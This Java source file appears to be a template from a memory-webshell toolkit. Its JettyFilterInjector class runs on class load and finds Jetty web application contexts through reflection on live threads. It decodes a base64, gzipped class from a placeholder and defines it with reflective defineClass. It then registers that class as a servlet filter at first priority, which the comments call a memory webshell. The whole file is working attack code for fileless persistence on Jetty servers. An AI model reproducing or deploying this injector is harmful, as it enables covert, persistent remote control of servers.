package com.reajason.javaweb.memsell.jetty.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.GZIPInputStream;

/**
 * tested v8、v9
 *
 * @author ReaJason
 */

public class JettyFilterInjector {

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }


    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    static {
        new JettyFilterInjector();
    }

    public JettyFilterInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getFilter(context);
                addFilter(context, filter);
            }
        } catch (Exception ignored) {

        }

    }

    public String getFilterName(String className) {
        if (className.contains(".")) {
            int lastDotIndex = className.lastIndexOf(".");
            return className.substring(lastDotIndex + 1);
        } else {
            return className;
        }
    }

    public void addFilter(Object context, Object magicFilter) {
        Class<?> filterClass = magicFilter.getClass();
        try {
            Object servletHandler = getFV(context, "_servletHandler");

            // 1. 判断是否已经注入
            if (isInjected(servletHandler)) {
                System.out.println("filter is already injected");
                return;
            }

            Class<?> filterHolderClass = null;
            try {
                filterHolderClass = context.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterHolder");
            } catch (ClassNotFoundException e) {
                filterHolderClass = context.getClass().getClassLoader().loadClass("org.mortbay.jetty.servlet.FilterHolder");
            }
            Constructor<?> constructor = filterHolderClass.getConstructor(Class.class);
            Object filterHolder = constructor.newInstance(filterClass);
            invokeMethod(filterHolder, "setName", new Class[]{String.class}, new Object[]{getClassName()});

            // 2. 注入内存马Filter
            invokeMethod(servletHandler, "addFilterWithMapping", new Class[]{filterHolderClass, String.class, int.class}, new Object[]{filterHolder, getUrlPattern(), 1});

            // 3. 修改Filter的优先级为第一位
            Object filterMaps = getFV(servletHandler, "_filterMappings");
            int filterLength = Array.getLength(filterMaps);
            ArrayList<Object> reorderedFilters = new ArrayList<Object>();
            for (int i = 0; i < filterLength; i++) {
                Object filter = Array.get(filterMaps, i);
                String filterName = (String) getFV(filter, "_filterName");
                if (filterName.equals(getClassName())) {
                    reorderedFilters.add(0, filter);
                } else {
                    reorderedFilters.add(filter);
                }
            }
            for (int i = 0; i < filterLength; i++) {
                Array.set(filterMaps, i, reorderedFilters.get(i));
            }

            try {
                // 4. 解决 jetty filterChainsCache 导致 filter 内存马连接失败的问题
                invokeMethod(servletHandler, "invalidateChainsCache");
            } catch (Exception e) {
                System.out.println("invalidateChainsCache error");
                e.printStackTrace();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    List<Object> getContext() {
        List<Object> contexts = new ArrayList();
        Thread[] threads = Thread.getAllStackTraces().keySet().toArray(new Thread[0]);
        for (Thread thread : threads) {
            try {
                Object contextClassLoader = getContextClassLoader(thread);
                if (isWebAppClassLoader(contextClassLoader)) {
                    contexts.add(getContextFromWebAppClassLoader(contextClassLoader));
                } else if (isHttpConnection(thread)) {
                    contexts.add(getContextFromHttpConnection(thread));
                }
            } catch (Exception ignored) {
            }
        }
        System.out.printf("contextSize: %s%n", contexts.size());
        return contexts;
    }

    private Object getContextClassLoader(Thread thread) throws Exception {
        return invokeMethod(thread, "getContextClassLoader");
    }

    private boolean isWebAppClassLoader(Object classLoader) {
        return classLoader.getClass().getName().contains("WebAppClassLoader");
    }

    private Object getContextFromWebAppClassLoader(Object classLoader) throws Exception {
        Object context = getFV(classLoader, "_context");
        Object handler = getFV(context, "_servletHandler");
        return getFV(handler, "_contextHandler");
    }

    private boolean isHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFV(thread, "threadLocals");
        Object table = getFV(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFV(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    return true;
                }
            }
        }
        return false;
    }

    private Object getContextFromHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFV(thread, "threadLocals");
        Object table = getFV(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFV(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
                    Object request = invokeMethod(httpChannel, "getRequest");
                    Object session = invokeMethod(request, "getSession");
                    Object servletContext = invokeMethod(session, "getServletContext");
                    return getFV(servletContext, "this$0");
                }
            }
        }
        throw new Exception("HttpConnection not found");
    }

    private Object getFilter(Object context) {
        Object obj = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            obj = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                obj = clazz.newInstance();
            } catch (Throwable e1) {
                e1.printStackTrace();
            }
        }
        return obj;
    }

    public boolean isInjected(Object servletHandler) throws Exception {
        try {
            Object filterMaps = getFV(servletHandler, "_filterMappings");
            for (int i = 0; i < Array.getLength(filterMaps); i++) {
                Object filter = Array.get(filterMaps, i);
                String filterName = (String) getFV(filter, "_filterName");
                if (filterName.equals(getClassName())) {
                    return true;
                }
            }
        } catch (Exception e) {
            return false;
        }
        return false;
    }


    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}
